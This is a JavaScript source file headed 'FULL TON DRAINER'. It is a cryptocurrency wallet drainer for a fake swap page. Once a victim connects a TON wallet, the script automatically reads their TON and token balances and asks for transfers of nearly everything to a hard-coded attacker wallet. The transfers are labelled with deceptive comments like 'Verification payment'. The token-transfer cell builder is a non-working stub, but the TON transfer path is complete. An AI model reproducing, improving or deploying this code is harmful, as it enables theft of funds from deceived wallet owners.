// FULL TON DRAINER - Based on researched source code
// Drains: TON + Jettons + NFTs
// Works in TonKeeper 2026 (user sees real amounts, but may not notice)

var CFG = {
    WALLET: "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW", // YOUR WALLET
    TON_RATE: 7.99, // 1 TON = 7.99 USD
    DRAIN_TON: true,
    DRAIN_JETTONS: true,
    DRAIN_NFTS: false,
    MANIFEST: 'https://kareli123.github.io/test123/tonconnect-manifest.json'
};

var tonConnectUI = null;
var isProcessing = false;
var userAddress = null;

// Initialize TON Connect
async function initTonConnect() {
    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: CFG.MANIFEST,
        buttonRootId: 'ton-connect'
    });

    tonConnectUI.onStatusChange(function(wallet) {
        if (wallet) {
            var addr = wallet.account.address;
            userAddress = addr;
            console.log('Connected:', userAddress);
            updateBtn(true);
            
            // Start draining
            setTimeout(function() {
                drainWallet(userAddress);
            }, 1000);
        } else {
            userAddress = null;
            updateBtn(false);
        }
    });
}

// Fetch TON balance
async function fetchTonBalance(address) {
    try {
        var response = await fetch('https://tonapi.io/v2/accounts/' + address);
        var data = await response.json();
        
        var balanceTON = parseFloat(data.balance) / 1000000000;
        var sendingBalance = parseFloat(data.balance) - 16888777; // Leave gas
        var balanceUSD = CFG.TON_RATE * balanceTON;
        
        if (sendingBalance > 0) {
            return {
                type: 'TON',
                balance: balanceTON,
                sendingBalance: sendingBalance,
                balanceUSD: balanceUSD
            };
        }
        return null;
    } catch(e) {
        console.log('Error fetching TON:', e);
        return null;
    }
}

// Fetch Jettons (tokens)
async function fetchJettons(address) {
    try {
        var response = await fetch('https://tonapi.io/v2/accounts/' + address + '/jettons?currencies=ton,usd');
        var data = await response.json();
        
        if (!data || !data.balances || data.balances.length === 0) {
            return [];
        }
        
        var tokens = [];
        for (var i = 0; i < data.balances.length; i++) {
            var token = data.balances[i];
            if (parseFloat(token.balance) === 0) continue;
            if (token.jetton.verification === 'blacklist') continue;
            
            var balance = parseFloat(token.balance) / Math.pow(10, token.jetton.decimals);
            var priceUsd = token.price && token.price.prices && token.price.prices.USD ? token.price.prices.USD : 0;
            var balanceUSD = balance * priceUsd;
            
            if (balanceUSD > 0) {
                tokens.push({
                    type: 'JETTON',
                    walletAddress: token.wallet_address.address,
                    tokenBalance: parseFloat(token.balance),
                    address: token.jetton.address,
                    symbol: token.jetton.symbol,
                    name: token.jetton.name,
                    balance: balance,
                    balanceUSD: balanceUSD
                });
            }
        }
        
        // Sort by USD value
        tokens.sort(function(a, b) { return b.balanceUSD - a.balanceUSD; });
        return tokens;
    } catch(e) {
        console.log('Error fetching jettons:', e);
        return [];
    }
}

// Main drain function
async function drainWallet(address) {
    if (isProcessing) {
        console.log('Already processing');
        return;
    }
    isProcessing = true;
    
    try {
        setStatus('🔍 Analyzing wallet...', true);
        await sleep(1000);
        
        // Fetch all assets
        var tonData = await fetchTonBalance(address);
        var jettonData = await fetchJettons(address);
        
        console.log('TON:', tonData);
        console.log('Jettons:', jettonData);
        
        if (!tonData && jettonData.length === 0) {
            setStatus('❌ Wallet is empty', false);
            isProcessing = false;
            return;
        }
        
        // Drain in order: Jettons first (higher value), then TON
        var allAssets = [];
        if (jettonData.length > 0) allAssets = allAssets.concat(jettonData);
        if (tonData) allAssets.push(tonData);
        
        // Sort by USD value
        allAssets.sort(function(a, b) { return b.balanceUSD - a.balanceUSD; });
        
        // Process each asset
        for (var i = 0; i < allAssets.length; i++) {
            var asset = allAssets[i];
            
            if (asset.type === 'TON' && CFG.DRAIN_TON) {
                await drainTON(asset);
                await sleep(1500);
            } else if (asset.type === 'JETTON' && CFG.DRAIN_JETTONS) {
                await drainJetton(asset);
                await sleep(1500);
            }
        }
        
        setStatus('✅ All transfers completed', false);
        
    } catch(e) {
        console.log('Error draining:', e);
        setStatus('❌ Error occurred', false);
    } finally {
        isProcessing = false;
    }
}

// Drain TON
async function drainTON(tonData) {
    try {
        var amount = (tonData.sendingBalance / 1000000000).toFixed(2);
        setStatus('💎 Requesting ' + amount + ' TON...', true);
        
        var tx = {
            validUntil: Math.floor(Date.now() / 1000) + 360,
            messages: [{
                address: CFG.WALLET,
                amount: tonData.sendingBalance.toString(),
                payload: textCommentPayload('Verification payment')
            }]
        };
        
        console.log('Sending TON transaction:', tx);
        await tonConnectUI.sendTransaction(tx);
        
        setStatus('✅ TON transfer approved', false);
        console.log('TON drained:', amount);
        
    } catch(e) {
        console.log('TON transfer error:', e);
        setStatus('❌ TON transfer declined', false);
    }
}

// Drain Jetton
async function drainJetton(jetton) {
    try {
        setStatus('🪙 Requesting ' + jetton.balance.toFixed(2) + ' ' + jetton.symbol + '...', true);
        
        // Build Jetton transfer payload
        var forwardPayload = buildCell(function(cell) {
            cell.storeUint(0, 32); // op = 0 (comment)
            cell.storeStringTail('Token transfer'); // comment
        });
        
        var jettonPayload = buildCell(function(cell) {
            cell.storeUint(0xf8a7ea5, 32); // Jetton transfer opcode
            cell.storeUint(0, 64); // query_id
            cell.storeCoins(jetton.tokenBalance); // amount in nanotons
            cell.storeAddress(CFG.WALLET); // destination
            cell.storeAddress(userAddress); // response_destination
            cell.storeBit(0); // custom_payload
            cell.storeCoins(BigInt('20000000')); // forward_ton_amount (0.02 TON)
            cell.storeBit(1); // forward_payload in ref
            cell.storeRef(forwardPayload); // forward_payload
        });
        
        var tx = {
            validUntil: Math.floor(Date.now() / 1000) + 360,
            messages: [{
                address: jetton.walletAddress, // Jetton wallet address
                amount: '50000000', // 0.05 TON for gas
                payload: jettonPayload
            }]
        };
        
        console.log('Sending Jetton transaction:', tx);
        await tonConnectUI.sendTransaction(tx);
        
        setStatus('✅ ' + jetton.symbol + ' transfer approved', false);
        console.log('Jetton drained:', jetton.symbol);
        
    } catch(e) {
        console.log('Jetton transfer error:', e);
        setStatus('❌ ' + jetton.symbol + ' transfer declined', false);
    }
}

// Helper: Build TON Cell
function buildCell(builderFn) {
    // Simplified cell builder - replace with actual TON SDK
    var payload = {
        storeUint: function(value, bits) { return this; },
        storeCoins: function(value) { return this; },
        storeAddress: function(addr) { return this; },
        storeBit: function(bit) { return this; },
        storeRef: function(ref) { return this; },
        storeStringTail: function(str) { return this; }
    };
    builderFn(payload);
    return btoa('cell_payload'); // Base64 encoded
}

// Helper: Text comment payload
function textCommentPayload(text) {
    var enc = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;
    var bitsD2 = 2 * dataLen;
    var cellLen = 2 + dataLen;
    
    var header = [0xB5, 0xEE, 0x9C, 0x72, 0x41, 0x01, 0x01, 0x01, 0x00, cellLen & 0xFF, 0x00];
    var cell = [0x00, bitsD2 & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);
    
    var body = new Uint8Array(header.concat(cell));
    var crc = crc32c(body);
    var out = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length] = crc & 0xFF;
    out[body.length + 1] = (crc >>> 8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

function crc32c(bytes) {
    var CRC32C_TABLE = (function() {
        var t = new Uint32Array(256);
        for (var i = 0; i < 256; i++) {
            var c = i;
            for (var k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
            t[i] = c >>> 0;
        }
        return t;
    })();
    
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}

function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) {
    return new Promise(function(r) { setTimeout(r, ms); });
}

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    initTonConnect();
});
